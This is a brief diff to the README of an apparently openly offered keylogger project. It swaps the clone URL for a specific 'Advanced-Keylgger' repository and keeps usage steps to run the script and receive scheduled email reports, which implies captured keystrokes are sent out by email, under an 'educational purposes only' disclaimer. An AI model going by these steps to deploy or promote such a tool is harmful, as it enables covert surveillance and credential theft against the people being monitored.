@@ -26,7 +26,7 @@
 🔧 Usage:
 
 Clone the repository.
-git clone https://github.com/your-username/KeyLogger-Secure.git
+git clone https://github.com/xXPl46u3Xx/Advanced-Keylgger.git
 python filename.py
 Receive scheduled email reports with valuable insights.
 📝 Note: This project is intended for educational purposes only. Use responsibly and ensure compliance with legal and ethical standards.
